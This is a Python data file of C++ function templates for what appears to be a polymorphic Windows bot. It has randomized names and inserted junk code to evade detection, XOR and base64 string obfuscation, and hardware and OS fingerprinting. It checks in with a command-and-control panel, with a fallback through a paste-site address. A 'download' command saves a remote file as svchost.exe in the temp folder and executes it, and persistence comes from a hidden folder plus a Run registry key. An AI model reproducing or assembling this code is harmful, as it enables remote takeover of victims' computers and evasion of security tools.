#Dead Functions Objectes
liveFunction = [
                #base64_decode -> [0];
                {
                    'header':
                                {
                                    'type':'static string',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [
                                                            {'type':'const string','name':'varNameRandom_1','pointer':'&', 'char':{'onOff':'n','value':'0'}},

                                                       ],
                                },


                    'content': [
                                    {'line':'string content_varRandom_1;'},
                                    {'line':'std::vector<int> content_varRandom_2(256, -1);'},
                                    {'line':'for (int i = 0; i<64; i++) content_varRandom_2["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;'},
                                    {'line':'int val = 0, valb = -8;'},
                                    {'line':'for (UCHAR c : varNameRandom_1) {'},
                                    {'line':'if (content_varRandom_2[c] == -1) break;'},
                                    {'line':'val = (val << 6) + content_varRandom_2[c];'},
                                    {'line':'valb += 6;'},
                                    {'line':'if (valb >= 0) {'},
                                    {'line':'content_varRandom_1.push_back(char((val >> valb) & 0xFF));'},
                                    {'line':'valb -= 8;'},
                                    {'line':'}\n}'},
                                    {'line':'return content_varRandom_1;'},
                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #reverse char-> [1];
                {
                    'header':
                                {
                                    'type':'void',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [
                                                            {'type':'char','name':'varNameRandom_1','pointer':'n', 'char':{'onOff':'y','value':'16'}},

                                                       ],
                                },


                    'content': [
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'char content_varRandom_1 = &main_xor_key[7];'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'char content_varRandom_2 = &main_xor_key[6];'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'char content_varRandom_3 = &main_xor_key[5];'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'char content_varRandom_4 = &main_xor_key[4];'},
                                    {'line':'char content_varRandom_5 = &main_xor_key[3];'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'char content_varRandom_6 = &main_xor_key[2];'},
                                    {'line':'char content_varRandom_7 = &main_xor_key[1];'},
                                    {'line':'char content_varRandom_8 = &main_xor_key[0];'},
                                    {'line':'randomCodeGenerator()'},

                                    {'line':'varNameRandom_1[0] = content_varRandom_1;'},
                                    {'line':'varNameRandom_1[1] = content_varRandom_2;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'varNameRandom_1[2] = content_varRandom_3;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'varNameRandom_1[3] = content_varRandom_4;'},
                                    {'line':'varNameRandom_1[4] = content_varRandom_5;'},
                                    {'line':'varNameRandom_1[5] = content_varRandom_6;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'varNameRandom_1[6] = content_varRandom_7;'},
                                    {'line':'varNameRandom_1[7] = content_varRandom_8;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'varNameRandom_1[8] = content_varRandom_8;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'varNameRandom_1[9] = content_varRandom_7;'},
                                    {'line':'varNameRandom_1[10] = content_varRandom_6;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'varNameRandom_1[11] = content_varRandom_5;'},
                                    {'line':'varNameRandom_1[12] = content_varRandom_4;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'varNameRandom_1[13] = content_varRandom_3;'},
                                    {'line':'varNameRandom_1[14] = content_varRandom_2;'},
                                    {'line':'varNameRandom_1[15] = content_varRandom_1;'},
                                    {'line':'randomCodeGenerator()'},




                                    {'line':'return;'},


                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #xor_flat ->[2];
                {
                    'header':
                                {
                                    'type':'string',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [
                                                            {'type':'string','name':'varNameRandom_1','pointer':'n', 'char':{'onOff':'n','value':'0'}},

                                                       ],
                                },


                    'content': [
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'string content_varRandom_2 = varNameRandom_1;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'for (int i = 0; i < varNameRandom_1.size(); i++){'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'content_varRandom_2[i] = varNameRandom_1[i] ^ &main_xor_key[i % (sizeof(&main_xor_key) / sizeof(char))];};'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'return content_varRandom_2;'},


                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #xor_reversed -> [3]
                {
                    'header':
                                {
                                    'type':'string',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [
                                                            {'type':'string','name':'varNameRandom_1','pointer':'n', 'char':{'onOff':'n','value':'0'}},

                                                       ],
                                },


                    'content': [
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'char content_varRandom_1[16];'},
                                    {'line':'&liveFunction_reverse_char(content_varRandom_1);'},
                                    {'line':'string content_varRandom_2 = varNameRandom_1;'},
                                    {'line':'for (int i = 0; i < varNameRandom_1.size(); i++){'},
                                    {'line':'content_varRandom_2[i] = varNameRandom_1[i] ^ content_varRandom_1[i % (sizeof(content_varRandom_1) / sizeof(char))];};'},
                                    {'line':'return content_varRandom_2;'},
                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #get_hd_id -> [4]
                {
                    'header':
                                {
                                    'type':'int',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [
                                                            {'type':'char','name':'varNameRandom_1','pointer':'y', 'char':{'onOff':'n','value':'0'}},

                                                       ],
                                },


                    'content': [
                                    {'line':'HW_PROFILE_INFO content_varRandom_1;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'if (GetCurrentHwProfile(&content_varRandom_1)) {'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'strcpy_s(varNameRandom_1, 254, content_varRandom_1.szHwProfileGuid);'},
                                    {'line':'return 0;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'}'},
                                    {'line':'else {'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'return 1;'},
                                    {'line':'}'},
                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #escape_json ->[5]
                {
                    'header':
                                {
                                    'type':'string',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [
                                                            {'type':'const string&','name':'varNameRandom_1','pointer':'n', 'char':{'onOff':'n','value':'0'}},

                                                       ],
                                },


                    'content': [
                                    {'line':'string content_varRandom_1;'},
                                    {'line':'content_varRandom_1.reserve(varNameRandom_1.length());'},
                                    {'line':'for (std::string::size_type i = 0; i < varNameRandom_1.length(); ++i)'},
                                    {'line':'{'},
                                    {'line':'switch (varNameRandom_1[i]) {'},

                                    {'line':'case '+"""'"'"""+':'},
                                    {'line':'content_varRandom_1 += "";'},
                                    {'line':'break;'},

                                    {'line':'case '+"""'/'"""+':'},
                                    {'line':'content_varRandom_1 += "/";'},
                                    {'line':'break;'},

                                    {'line':'case '+r"""'\b'"""+':'},
                                    {'line':'content_varRandom_1 += "";'},
                                    {'line':'break;'},

                                    {'line':'case '+r"""'\f'"""+':'},
                                    {'line':'content_varRandom_1 += "";'},
                                    {'line':'break;'},

                                    {'line':'case '+r"""'\n'"""+':'},
                                    {'line':'content_varRandom_1 += "";'},
                                    {'line':'break;'},

                                    {'line':'case '+r"""'\r'"""+':'},
                                    {'line':'content_varRandom_1 += "";'},
                                    {'line':'break;'},

                                    {'line':'case '+r"""'\t'"""+':'},
                                    {'line':'content_varRandom_1 += "";'},
                                    {'line':'break;'},

                                    {'line':'case '+r"""'\\'"""+':'},
                                    {'line':'content_varRandom_1 += "";'},
                                    {'line':'break;'},

                                    {'line':'default:'},
                                    {'line':'content_varRandom_1 += varNameRandom_1[i];'},
                                    {'line':'break;'},
                                    {'line':'}'},
                                    {'line':'}'},
                                    {'line':'return content_varRandom_1;'},

                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #os_version ->[6]
                {
                    'header':
                                {
                                    'type':'string',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [

                                                       ],
                                },


                    'content': [
                                    {'line':'string content_varRandom_1 = "N/a";'},

                                    {'line':'if (IsWindowsXPOrGreater()){'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'content_varRandom_1 = "Xp_n/Sp";'},
                                    {'line':'};'},
                                    {'line':'randomCodeGenerator()'},

                                    {'line':'if (IsWindowsXPSP1OrGreater()){'},
                                    {'line':'content_varRandom_1 = "Xp_Sp-1";'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'};'},
                                    {'line':'randomCodeGenerator()'},

                                    {'line':'if (IsWindowsXPSP2OrGreater()){'},
                                    {'line':'content_varRandom_1 = "Xp_Sp-2";'},
                                    {'line':'};'},

                                    {'line':'if (IsWindowsXPSP3OrGreater()){'},
                                    {'line':'content_varRandom_1 = "Xp_Sp-3";'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'};'},

                                    {'line':'if (IsWindowsVistaOrGreater()){'},
                                    {'line':'content_varRandom_1 = "Vista_n/Sp";'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'};'},

                                    {'line':'randomCodeGenerator()'},
                                    {'line':'if (IsWindowsVistaSP1OrGreater()){'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'content_varRandom_1 = "Vista_Sp-1";'},
                                    {'line':'};'},

                                    {'line':'if (IsWindowsVistaSP2OrGreater()){'},
                                    {'line':'content_varRandom_1 = "Vista_Sp-2";'},
                                    {'line':'};'},

                                    {'line':'randomCodeGenerator()'},
                                    {'line':'if (IsWindows7OrGreater()){'},
                                    {'line':'content_varRandom_1 = "w7_n/Sp";'},
                                    {'line':'};'},

                                    {'line':'if (IsWindows7SP1OrGreater()){'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'content_varRandom_1 = "w7_Sp-1";'},
                                    {'line':'};'},

                                    {'line':'if (IsWindows8OrGreater()){'},
                                    {'line':'content_varRandom_1 = "w8";'},
                                    {'line':'};'},
                                    {'line':'randomCodeGenerator()'},

                                    {'line':'if (IsWindows8Point1OrGreater()){'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'content_varRandom_1 = "w8_P-1";'},
                                    {'line':'};'},

                                    {'line':'if (IsWindows10OrGreater()){'},
                                    {'line':'content_varRandom_1 = "w10";'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'};'},

                                    {'line':'if (IsWindowsServer()){'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'content_varRandom_1 = "W_Server";'},
                                    {'line':'};'},
                                    {'line':'randomCodeGenerator()'},

                                    {'line':'return content_varRandom_1;'},

                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #encode_constructor ->[7] ->need Randomize it
                {
                    'header':
                                {
                                    'type':'string',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [
                                                            {'type':'string','name':'varNameRandom_1','pointer':'n', 'char':{'onOff':'n','value':'0'}},

                                                       ],
                                },


                    'content': [
                                    {'line':'string content_varRandom_1;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'varNameRandom_1 = &livefunction_xor_flat(varNameRandom_1);'},
                                    {'line':'std::vector<byte> content_varRandom_2(varNameRandom_1.begin(), varNameRandom_1.end());'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'string content_varRandom_3 = &livefunction_base64_encode(&content_varRandom_2[0], content_varRandom_2.size());'},
                                    {'line':'content_varRandom_1 = &livefunction_xor_reversed(content_varRandom_3);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'std::vector<byte> content_varRandom_4(content_varRandom_1.begin(), content_varRandom_1.end());'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'return &livefunction_base64_encode(&content_varRandom_4[0], content_varRandom_4.size());'},

                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #decode_constructor ->[8]
                {
                    'header':
                                {
                                    'type':'string',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [
                                                            {'type':'string','name':'varNameRandom_1','pointer':'n', 'char':{'onOff':'n','value':'0'}},

                                                       ],
                                },


                    'content': [
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'varNameRandom_1 = &livefunction_base64_decode(varNameRandom_1);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'string content_varRandom_1 = &livefunction_xor_reversed(varNameRandom_1);'},
                                    {'line':'string content_varRandom_2 = &livefunction_base64_decode(content_varRandom_1);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'return &livefunction_xor_flat(content_varRandom_2);'},

                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #make_url ->[9]
                {
                    'header':
                                {
                                    'type':'string',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [
                                                            {'type':'string','name':'varNameRandom_1','pointer':'n', 'char':{'onOff':'n','value':'0'}},

                                                       ],
                                },


                    'content': [
                                    {'line':'randomCodeGenerator()'},

                                    {'line':'char content_varRandom_1[256];'},

                                    {'line':'randomCodeGenerator()'},

                                    {'line':r'size_t endpos = varNameRandom_1.find_last_not_of("\r\n");'},

                                    {'line':'if(endpos != std::string::npos) {'},

                                    {'line':'varNameRandom_1.substr(0,endpos+1).swap(varNameRandom_1);'},

                                    {'line':'}'},

                                    {'line':'string content_varRandom_2 = "/";'},

                                    {'line':'string content_varRandom_3;'},

                                    {'line':'randomCodeGenerator()'},

                                    {'line':'string content_varRandom_4;'},

                                    {'line':'randomCodeGenerator()'},

                                    {'line':'string content_varRandom_5;'},

                                    {'line':'randomCodeGenerator()'},

                                    {'line':'string content_varRandom_6;'},

                                    {'line':'&livefunction_get_id(content_varRandom_1);'},

                                    {'line':'randomCodeGenerator()'},

                                    {'line':'content_varRandom_6 = &livefunction_os_version();'},

                                    {'line':'randomCodeGenerator()'},

                                    {'line':'content_varRandom_3 = string(content_varRandom_1) + content_varRandom_2 + content_varRandom_6 + content_varRandom_2 + string("&mainArray_bot_version");'},
                                    {'line':'content_varRandom_5 = &livefunction_encode_constructor(content_varRandom_3);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'string content_varRandom_7 = varNameRandom_1 + content_varRandom_2 + &mainArray_panel_key + content_varRandom_2 + content_varRandom_5 ;'},
                                    {'line':'return content_varRandom_7 ;'},
                                    {'line':'randomCodeGenerator()'},

                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #http_request ->[10]
                {
                    'header':
                                {
                                    'type':'int',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [
                                                            {'type':'char','name':'varNameRandom_1','pointer':'y', 'char':{'onOff':'n','value':'0'}},
                                                            {'type':'char','name':'varNameRandom_2','pointer':'y', 'char':{'onOff':'n','value':'0'}},
                                                            {'type':'DWORD','name':'varNameRandom_3','pointer':'n', 'char':{'onOff':'n','value':'0'}},

                                                       ],
                                },


                    'content': [    {'line':'randomCodeGenerator()'},
                                    {'line':'DWORD content_varRandom_1 = 0;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'RtlZeroMemory(varNameRandom_2, varNameRandom_3);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'HINTERNET content_varRandom_2 = InternetOpen("browser", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'if (content_varRandom_2) {;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'HINTERNET content_varRandom_3 = InternetOpenUrl(content_varRandom_2, varNameRandom_1, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);'},
                                    {'line':'randomCodeGenerator()'},

                                    {'line':'if (content_varRandom_3) {'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'InternetReadFile(content_varRandom_3, varNameRandom_2, varNameRandom_3, &content_varRandom_1);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'InternetCloseHandle(content_varRandom_2);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'InternetCloseHandle(content_varRandom_3);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'return content_varRandom_1;'},
                                    {'line':'}'},
                                    {'line':'else {'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'char content_varRandom_4[256];'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'HINTERNET content_varRandom_5 = InternetOpenUrl(content_varRandom_2, &livefunction_base64_decode(&mainArray_paster_bin).c_str(), NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'if (content_varRandom_5) {'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'InternetReadFile(content_varRandom_5, content_varRandom_4, sizeof(content_varRandom_4), &content_varRandom_1);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'InternetCloseHandle(content_varRandom_5);'},

                                    {'line':'string content_varRandom_6 = content_varRandom_4;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'string content_varRandom_7 = content_varRandom_6.substr(0, content_varRandom_6.find("/nellbForRase", 0));'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'string content_varRandom_8 = &livefunction_url_constructor(content_varRandom_7);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'const char * content_varRandom_9 = content_varRandom_8.c_str();'},

                                    {'line':'HINTERNET content_varRandom_10 = InternetOpenUrl(content_varRandom_2, content_varRandom_9, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'if (content_varRandom_10) {'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'InternetReadFile(content_varRandom_10, varNameRandom_2, varNameRandom_3, &content_varRandom_1);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'InternetCloseHandle(content_varRandom_2);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'InternetCloseHandle(content_varRandom_10);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'return content_varRandom_1;'},
                                    {'line':'}'},

                                    {'line':'else {'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'InternetCloseHandle(content_varRandom_2);'},

                                    {'line':'}'},
                                    {'line':'}'},
                                    {'line':'}'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'InternetCloseHandle(content_varRandom_2);'},

                                    {'line':'};'},
                                    {'line':'return -1;'},

                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #StartUp Pogram (start_up) ->[11] -> mantain
                {
                    'header':
                                {
                                    'type':'void',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [
                                                            {'type':'LPCTSTR','name':'varNameRandom_1','pointer':'n', 'char':{'onOff':'n','value':'0'}},
                                                        ],
                                },


                    'content': [
                                    {'line':'STARTUPINFO content_varRandom_1;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'PROCESS_INFORMATION content_varRandom_2;'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'ZeroMemory(&content_varRandom_1, sizeof(content_varRandom_1));'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'content_varRandom_1.cb = sizeof(content_varRandom_1);'},
                                    {'line':'ZeroMemory(&content_varRandom_2, sizeof(content_varRandom_2));'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'CreateProcess(varNameRandom_1, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &content_varRandom_1, &content_varRandom_2);'},
                                    {'line':'CloseHandle(content_varRandom_2.hProcess);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'CloseHandle(content_varRandom_2.hThread);'},

                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #Comand_constructor  (command_constructor) ->[12]
                {
                    'header':
                                {
                                    'type':'void',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [
                                                            {'type':'string','name':'varNameRandom_1','pointer':'n', 'char':{'onOff':'n','value':'0'}},
                                                        ],
                                },


                    'content': [
                                    {'line':'bool content_varRandom_1 = reader.parse(varNameRandom_1, root);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'if (content_varRandom_1) {'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'string content_varRandom_2 = &mainLiveFunction_escape_json(root["action"].toStyledString());'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'if (content_varRandom_2 == "download") {'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'string content_varRandom_3 =  &mainLiveFunction_escape_json(root["data"].toStyledString());'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'char *content_varRandom_4 = (char *)content_varRandom_3.c_str();'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'char content_varRandom_5[MAX_PATH];'},
                                    {'line':'GetTempPath(MAX_PATH, content_varRandom_5);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':r'strcat(content_varRandom_5, "\\svchost.exe");'},
                                    {'line':'URLDownloadToFile(NULL, content_varRandom_4, content_varRandom_5, 0, NULL);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'&liveFunction_startUp_pogram(content_varRandom_5);'},
                                    {'line':'}else if(content_varRandom_2 == "null"){'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'//Nothing'},
                                    {'line':'}'},
                                    {'line':'}'},

                                    {'line':'}\n'}
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #add_to_start_up ->[13]
                {
                    'header':
                                {
                                    'type':'void',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [

                                                        ],
                                },


                    'content': [


                                    {'line':'char content_varRandom_1[MAX_PATH];'},

                                    {'line':'randomCodeGenerator()'},

                                    {'line':'GetModuleFileName(NULL, content_varRandom_1, MAX_PATH);'},

                                    {'line':'randomCodeGenerator()'},

                                    {'line':'HKEY content_varRandom_2;'},

                                    {'line':'randomCodeGenerator()'},

                                    {'line':r'RegOpenKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &content_varRandom_2);'},

                                    {'line':'randomCodeGenerator()'},

                                    {'line':'RegSetValueEx(content_varRandom_2, "Windows", 0, REG_SZ, (LPBYTE)content_varRandom_1, sizeof(content_varRandom_1));'},

                                    {'line':'randomCodeGenerator()'},

                                    {'line':'RegCloseKey(content_varRandom_2);'},

                                    {'line':'}\n'},
                                ],

                    'return': 'funcNameRandom_1'
                    },

                #Add_to_start_up_Change directory ->[14]
                {
                    'header':
                                {
                                    'type':'void',
                                    'function_name':'funcNameRandom_1',
                                    'function_params':
                                                       [

                                                        ],
                                },


                    'content': [


                                    {'line':'char content_varRandom_1[255];'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'char content_varRandom_2[255];'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'char content_varRandom_3[255];'},

                                    {'line':r'string content_varRandom_4 = string("C:\\WindowsSp2");'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'if (!CreateDirectory(content_varRandom_4.c_str(), NULL))'},
                                    {'line':'{'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'return;'},
                                    {'line':'}'},

                                    {'line':'SetFileAttributes(content_varRandom_4.c_str(), FILE_ATTRIBUTE_HIDDEN);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'::GetModuleFileName(NULL, content_varRandom_1, 255);'},
                                    {'line':'::GetFileTitle(content_varRandom_1, content_varRandom_2, 255);'},
                                    {'line':'randomCodeGenerator()'},

                                    {'line':r'strcpy(content_varRandom_3, (content_varRandom_4 + "\\").c_str());'},
                                    {'line':'string content_varRandom_5 = content_varRandom_2 + string(".exe");'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'strcat(content_varRandom_3, content_varRandom_5.c_str());'},

                                    {'line':'::CopyFile(content_varRandom_1, content_varRandom_3, FALSE);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'HKEY content_varRandom_6;'},
                                    {'line':r'RegOpenKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &content_varRandom_6);'},
                                    {'line':'randomCodeGenerator()'},

                                    {'line':'RegSetValueEx(content_varRandom_6, "Windows", 0, REG_SZ, (LPBYTE)content_varRandom_3, sizeof(content_varRandom_3));'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'RegCloseKey(content_varRandom_6);'},
                                    {'line':'randomCodeGenerator()'},
                                    {'line':'return;'},

                                    {'line':'}\n'},
                                ],

                    'return': 'funcNameRandom_1'
                    },

               ]
